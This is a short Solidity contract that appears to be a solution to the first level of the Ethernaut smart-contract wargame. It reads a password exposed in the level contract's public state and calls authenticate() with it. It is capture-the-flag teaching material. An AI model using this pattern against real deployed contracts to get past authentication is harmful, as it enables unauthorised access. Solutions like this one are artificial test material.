// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Instance as HelloEthernaut} from "../../src/1-hello-ethernaut/HelloEthernaut.sol";

contract HelloEthernautAttacker{
  HelloEthernaut helloEthernaut;

  constructor(address _helloEthernaut) {
    helloEthernaut = HelloEthernaut(_helloEthernaut);
  }

  function attack() public{
    string memory pass = helloEthernaut.password();
    helloEthernaut.authenticate(pass);
  }
}